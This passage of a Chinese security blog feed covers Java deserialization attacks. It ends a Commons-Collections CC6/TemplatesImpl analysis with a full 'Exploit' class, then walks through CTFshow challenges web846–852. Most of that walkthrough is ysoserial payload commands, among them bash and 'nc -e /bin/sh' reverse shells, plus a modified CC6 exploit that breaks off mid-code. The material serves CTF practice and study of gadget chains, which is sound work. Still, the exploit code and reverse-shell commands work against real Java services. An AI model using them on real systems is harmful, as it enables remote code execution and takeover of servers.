class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-使用-CC6-链前半部分"><a href="#4-2-使用-CC6-链前半部分" class="headerlink" title="4.2 使用 CC6 链前半部分"></a>4.2 使用 CC6 链前半部分</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">{</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:/Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"rce"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InstantiateTransformer</span> instantiateTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                instantiateTransformer        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment">// 防止在 put 时执行</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>                <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 lazyMap</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 tiedMapEntry</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 利用 HashMap 触发 hashCode</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> expHashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 利用反射修改为正确值</span>        <span class="token class-name">Field</span> iTransformers <span class="token operator">=</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iTransformers<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iTransformers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 清除 put 对 lazyMap 的影响</span>        lazyMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 执行序列化与反序列化</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>expHashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayInputStream</span> byteArrayInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h2><p><a href="https://github.com/frohoff/ysoserial">ysoserial</a></p><p><a href="https://www.bilibili.com/video/BV1Zf4y1F74K/?spm_id_from=333.788&amp;vd_source=dd26cd5a62866062ca6f169ff25165f0">Java反序列化CommonsCollections篇(三)-另一种命令执行方式</a></p><p><a href="https://xz.aliyun.com/t/9409#toc-1">CC链 1-7 分析</a></p>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC 链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 秀 - Java 反序列化</title>
      <link href="/2023/01/26/catchtheflag/ctf-xiu/ctf-xiu-java-fan-xu-lie-hua/"/>
      <url>/2023/01/26/catchtheflag/ctf-xiu/ctf-xiu-java-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-秀-Java-反序列化"><a href="#CTF-秀-Java-反序列化" class="headerlink" title="CTF 秀 - Java 反序列化"></a>CTF 秀 - Java 反序列化</h1><p>工具列表</p><ul><li><a href="https://github.com/frohoff/ysoserial">ysoserial</a></li></ul><h2 id="1-web846"><a href="#1-web846" class="headerlink" title="1. web846"></a>1. web846</h2><ul><li>题目描述</li></ul><p>ctfshow会对你post提交的<strong>ctfshow</strong>参数进行base64解码然后进行反序列化构造出对当前题目地址的dns查询即可获得flag</p><ul><li>题目解析</li></ul><p>简单的 URLDNS，直接使用工具生成</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS <span class="token string">'http://f230b38e-28a9-48fa-9a88-1a02abcd06f8.challenge.ctf.show/'</span> <span class="token operator">|</span> base64 <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-web847"><a href="#2-web847" class="headerlink" title="2. web847"></a>2. web847</h2><ul><li>题目提示</li></ul><p>题目环境中，没有nc和curl命令</p><ul><li>题目描述</li></ul><p>提交<strong>ctfshow</strong>参数进行base64解码<br>然后进行反序列化<br>我是java7，使用了<strong>commons-collections 3.1</strong>的库<br>为了保证业务安全，我删除了nc和curl命令<br>下面是我接收参数的代码<br>data=new BASE64Decoder().decodeBuffer(request.getParameter(“ctfshow”));`</p><ul><li>题目解析</li></ul><p>使用 commons-collections 3.1 的库，可以使用 C1、CC3、CC5、CC6、CC7 进行攻击</p><p>执行反弹 shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">"bash -c {echo,执行命令的Base64编码}|{base64,-d}|{bash,-i}"</span> <span class="token operator">|</span> base64 <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-web848"><a href="#3-web848" class="headerlink" title="3. web848"></a>3. web848</h2><ul><li>题目描述</li></ul><p> 提交<strong>ctfshow</strong>参数进行base64解码<br>然后进行反序列化<br>我是java7，使用了<strong>commons-collections 3.1</strong>的库<br>为了保证业务安全，我删除了nc和curl命令<br>甚至不准用TransformedMap类反序列化<br>下面是我接收参数的代码<br><code>data=new BASE64Decoder().decodeBuffer(request.getParameter("ctfshow"));</code></p><ul><li>题目解析</li></ul><p>提示不能使用 TransformedMap 类，使用 CC1 外其他的链子即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">"bash -c {echo,执行命令的Base64编码}|{base64,-d}|{bash,-i}"</span> <span class="token operator">|</span> base64 <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-web849"><a href="#4-web849" class="headerlink" title="4. web849"></a>4. web849</h2><ul><li>题目提示</li></ul><p>CC链之二，可以用nc反弹</p><ul><li>题目描述</li></ul><p>提交<strong>ctfshow</strong>参数进行base64解码<br>然后进行反序列化<br>我是java8，使用了<strong>commons-collections 4.0</strong>的库<br>为了保证业务安全，我删除了nc和curl命令</p><p>下面是我接收参数的代码<br><code>data=new BASE64Decoder().decodeBuffer(request.getParameter("ctfshow"));</code></p><ul><li>题目解析</li></ul><p>使用了 commons-collections 4.0 的库，可以使用 CC2 与 CC4 链进行攻击</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 <span class="token string">"nc IP PORT -e /bin/sh"</span> <span class="token operator">|</span> base64 <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-web850"><a href="#5-web850" class="headerlink" title="5. web850"></a>5. web850</h2><ul><li>题目描述</li></ul><p>提交<strong>ctfshow</strong>参数进行base64解码<br>然后进行反序列化<br>我是java7，使用了<strong>commons-collections 3.1</strong>的库并对一些可能有危险的类进行了封禁，<br>为了保证业务安全，我删除了nc和curl命令<br>下面是我接收参数的代码<br><code>data=new BASE64Decoder().decodeBuffer(request.getParameter("ctfshow"));</code></p><ul><li>题目解析</li></ul><p>封禁了一些可用的类，测试一下 CC3 还可以使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections3 <span class="token string">"bash -c {echo,执行命令的Base64编码}|{base64,-d}|{bash,-i}"</span> <span class="token operator">|</span> base64 <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-web851-web852"><a href="#6-web851-web852" class="headerlink" title="6. web851 - web852"></a>6. web851 - web852</h2><ul><li>题目描述</li></ul><p>提交<strong>ctfshow</strong>参数进行base64解码<br>然后进行反序列化<br>我是java8，使用了<strong>commons-collections 4.0</strong>的库并对一些可能有危险的类进行了封禁，<br>为了保证业务安全，我删除了nc和curl命令</p><p>下面是我接收参数的代码<br><code>data=new BASE64Decoder().decodeBuffer(request.getParameter("ctfshow"));</code></p><ul><li>题目解析</li></ul><p>题目中禁用掉了 LazyMap，这里使用 DefaultedMap 进行代替，使用 CC6 修改一下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">DefaultedMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token 